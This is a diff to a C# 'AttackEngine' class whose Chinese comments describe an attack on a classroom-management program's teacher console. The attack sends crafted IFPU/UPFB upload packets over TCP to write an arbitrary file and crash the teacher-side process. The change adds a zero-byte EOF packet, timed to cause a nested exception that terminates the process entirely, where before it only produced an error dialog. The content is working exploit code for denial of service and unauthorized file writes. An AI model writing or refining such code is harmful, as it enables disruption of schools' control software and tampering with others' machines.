@@ -183,8 +183,10 @@ public class AttackEngine : IDisposable
         => CommandCrashOnce(PacketBuilder.BuildAnswerSheetCrashPacket(), ct);
 
     /// <summary>
-    /// IFPU+UPFB 上传崩溃攻击: 任意文件写入 + 教师端进程崩溃
-    /// 实测: 每次 UPFB 写入均崩溃教师端 (100% 触发)
+    /// IFPU+UPFB 上传崩溃攻击: 任意文件写入 + 教师端进程终止
+    /// 实测: 每次 UPFB 写入均触发完成回调崩溃 (100% 触发)
+    /// UPFB 后追加 EOF 收尾包: 第二次完成回调在首次崩溃处理未完成时触发
+    /// 嵌套未处理异常 => 进程整体终止 (仅 UPFB 时教师端只弹框, 进程继续存活)
     /// </summary>
     private void UpfbUploadCrashOnce(CancellationToken ct)
     {
@@ -196,6 +198,8 @@ public class AttackEngine : IDisposable
         string targetFile = @"C:\Windows\Temp\jy_upload.tmp";
         byte[] ifpu = PacketBuilder.BuildIfpuUploadPacket(guid, targetFile, (uint)data.Length);
         byte[] upfb = PacketBuilder.BuildUpfbDataPacket(guid, data);
+        // EOF 收尾包: 0 字节数据, 触发第二次完成回调 -> 嵌套异常 -> 进程级终止
+        byte[] eof = PacketBuilder.BuildUpfbDataPacket(guid, Array.Empty<byte>());
 
         using var client = new TcpClient(AddressFamily.InterNetwork);
         client.NoDelay = true;
@@ -226,10 +230,20 @@ public class AttackEngine : IDisposable
 
         ct.WaitHandle.WaitOne(200);
 
-        // UPFB 数据块 (触发崩溃)
+        // UPFB 数据块 (触发第一次完成回调崩溃)
         client.GetStream().Write(upfb, 0, upfb.Length);
         Interlocked.Increment(ref Stats.PacketsSent);
         Interlocked.Add(ref Stats.BytesSent, upfb.Length);
+
+        // 等首次崩溃触发 (弹框), 再发 EOF -> 嵌套异常 -> 进程终止
+        ct.WaitHandle.WaitOne(400);
+        try
+        {
+            client.GetStream().Write(eof, 0, eof.Length);
+            Interlocked.Increment(ref Stats.PacketsSent);
+            Interlocked.Add(ref Stats.BytesSent, eof.Length);
+        }
+        catch { }
 
         // 连接被重置/EOF => 教师端崩溃
         try
